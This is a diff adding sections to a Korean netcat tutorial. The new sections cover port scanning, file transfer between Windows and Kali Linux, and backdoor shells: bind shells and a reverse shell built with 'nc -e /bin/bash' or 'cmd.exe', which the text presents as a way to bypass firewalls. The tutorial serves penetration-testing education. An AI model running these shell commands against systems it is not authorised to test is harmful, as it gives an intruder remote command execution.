@@ -71,4 +71,46 @@ https://www.sans.org/security-resources/sec560/netcat_cheat_sheet_v1.pdf<br><br>
 `echo -e "HEAD / HTTP/1.0\n\n" | nc [IP] 80`<br>
 <div align="center"><img src ="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgoaWHzRs5Eysrtj7MwxJwG93oiVnlK0lhMfsw458wNV7xJYfmxaXrF4mYtIJa-S3t6HVqeSGTxlGrjFngRQHSYpugvkM1nkyIBDjfsZwvRPJxWPNmBe3h70eUUK9qlR8mfkzHGiNtpOzQ/s1600/%25EC%2584%259C%25EB%25B9%2584%25EC%258A%25A4+%25EB%25B0%25B0%25EB%2584%2588+%25EC%2588%2598%25EC%25A7%2591.png"></div><br><br>
 
+3. 포트 스캐닝<br>
+TCP 프로토콜을 사용하여 특정 포트나 포트 범위를 스캔함.<br>
+`nc -n -v -z -w 1 [IP] [포트 범위]`<br>
+<div align="center"><img src ="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh13c9lcWxw5TwLBJpjyNLUm_NZ3zAsQujCfqBInGQ77S6RUAJ5DL5lzdX37VcE_8vbXM0Ux9quTZPYrTjypVuipPBIiaHJcl7cBBkknPy6ikZF1FYbGhW6EZh2m5FDpTQ_PUZ_ut1jwxc/s1600/%25ED%258F%25AC%25ED%258A%25B8+%25EC%258A%25A4%25EC%25BA%2590%25EB%258B%259D.png"></div><br><br>
+
+4. 파일 전송<br>
+클라이언트(윈도우) -> 서버(Kali Linux)로 파일 전송<br>
+클라이언트<br>
+`nc -w3 [IP] [Port] < [파일명]`<br>
+서버<br>
+`nc -l -p [Port] > [파일명]`<br>
+<div align="center"><img src ="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhLJghqkvJi7EEYkN5gOMcpHOrLAssBsvMkaFseVbjUZ26uWPYWigxTUkSpL_d-qDlSow1hVAbyeoPkAOwBYLI3MS_Orkt2YY6K1u9fsnUeuI1sjW0aTab7uavss0mjGbiAAaZgcuNqs9Y/s1600/%25ED%2581%25B4%25EB%259D%25BC%25EC%259D%25B4%25EC%2596%25B8%25ED%258A%25B8%2528%25EC%259C%2588%25EB%258F%2584%25EC%259A%25B0%2529-%25EC%2584%259C%25EB%25B2%2584%2528Kali+Linux%2529%25EB%25A1%259C+%25ED%258C%258C%25EC%259D%25BC+%25EC%25A0%2584%25EC%2586%25A1_1.png"></div><br>
+<div align="center"><img src ="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhesAfNu5IJ2nouAur7moiNTHJ-NOV99AZq0ScVga1EFcziWg7qjVBuvRycwNYQPLW3NHvxT-McO7iDvJXYUtvqK5Xlni5ZMjG3pujhXPey6-JA_GrJOqfUq2rKIVCTI18j1eYIKashfuM/s1600/%25ED%2581%25B4%25EB%259D%25BC%25EC%259D%25B4%25EC%2596%25B8%25ED%258A%25B8%2528%25EC%259C%2588%25EB%258F%2584%25EC%259A%25B0%2529-%25EC%2584%259C%25EB%25B2%2584%2528Kali+Linux%2529%25EB%25A1%259C+%25ED%258C%258C%25EC%259D%25BC+%25EC%25A0%2584%25EC%2586%25A1_2.png"></div><br><br>
+
+5. 백도어 쉘 (Backdoor Shell)<br>
+Netcat 툴을 이용한 백도어 쉘의 기본 매커니즘은 특정 포트(-p)에서 listen 모드(-l)로 실행하여 연결 수립 시 특정 쉘을 실행(-e)하도록 옵션을 지정하는 방식임.<br><br>
+
+리눅스 환경(서버)에서 백도어 쉘<br>
+`nc -l -p [로컬 포트] -e /bin/bash`<br><br>
+
+윈도우 환경(서버)에서 백도어 쉘<br>
+`nc -l -p [로컬 포트] -e cmd.exe`<br>
+<div align="center"><img src ="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhBdx0Kzn5FlS4vy-O59_HtqxLVa1amIMhFdxbKwmRBLxk_HUM-LPMLg6asSVyahZohOVEMXvrNGzvjSY0osxM9mJOwuSfXV2Ck_u8AcP4XqCydi61KwSpbA8CAyPt8xx7_e_7x1OHXt0U/s1600/Backdoor+Shell+%25EC%2584%259C%25EB%25B2%2584.png"></div><br>
+<div align="center"><img src ="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhSZei4HxKQGGb3QYa8gsdrbxiTfBQp15VwdjTCm0jfB2U2xEm3E70xUFhmq4tmR4BclG12RoUtChqnRztb-o6iqerwGEVeFL99ZTZoB9R2Mvbs1z4xA2pDatgcHElAgdSsbyafrpimIRw/s1600/Backdoor+Shell+%25ED%2581%25B4%25EB%259D%25BC%25EC%259D%25B4%25EC%2596%25B8%25ED%258A%25B81.png"></div><br>
+<div align="center"><img src ="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhJ9VfZoyrHFHhQ4ldYU6bQfgrH8yPhikT1dCuZSx_Oi9giWq-mohcOVc_WjqC46L_vlEJO_ikY1NLBYquwb9pR1E1zNDUAmJsumn9Q_8wa71aRwDqaYxLCpv3FfFCSAjVnDblt6_c-Dt8/s1600/Backdoor+Shell+%25ED%2581%25B4%25EB%259D%25BC%25EC%259D%25B4%25EC%2596%25B8%25ED%258A%25B82.png"></div><br>
+위 스샷에서 서버(Kali Linux) 측 쉘에 접속 후 명령어 뒤에 세미콜론 문자(;)를 덧붙여야 함.<br>
+(사용하는 클라이언트 마다 다를 수 있음)<br><br>
+
+6. 리버스 쉘 (Reverse Shell)<br>
+
+**Netcat 툴을 이용한 백도어 쉘의 기본 매커니즘은 백도어 쉘과는 반대로 보통 서버 앞단에 방화벽을 우회하기 위해서 리버스 쉘을 이용함.**<br>
+**방화벽에서 허용된 나가는 포트를 이용하여 클라이언트 측에서 쉘을 실행시킨 후 서버 측에서 접속함.**<br><br>
+
+리눅스 환경(서버)에서 리버스 쉘<br>
+`nc [자신의 IP 주소] [포트] -e /bin/bash`<br><br>
+
+윈도우 환경(서버)에서 리버스 쉘<br>
+`nc -l -p [로컬 포트] -e cmd.exe`<br>
+`nc [자신의 IP 주소] [포트] -e cmd.exe`<br>
+
+<div align="center"><img src ="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjQWHXV2Sba-_p1a2eB8zqbCVgQqAaJ-aakB2RXHV05B8I5LH3zkcIdkmRvxFy9QyqSSzzSo51nKxzc_Y1Yiv1OCaR6kd6H-8zVXYHyACv0Bwx7TSVirNYVyC6tbfCSndhpXyRI8ys7-3M/s1600/Reverse+Shell+%25EC%2584%259C%25EB%25B2%2584.png"></div><br>
+<div align="center"><img src ="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgILlZyiTOyqIOo5Gchyphenhyphen5sn1Ypk0XQImvPwJXuZrrCA_Kt0TiyL3tUHnGclcnSH5-Un9W5DhwrzuIr-H6k6lnpD-PmHOP80Y6bl4sny7yyx6yEUxVGKL5elIWNmSDI5UqHXT9RSVTLAjn8/s1600/Reverse+Shell+%25ED%2581%25B4%25EB%259D%25BC%25EC%259D%25B4%25EC%2596%25B8%25ED%258A%25B8.png"></div><br>
 
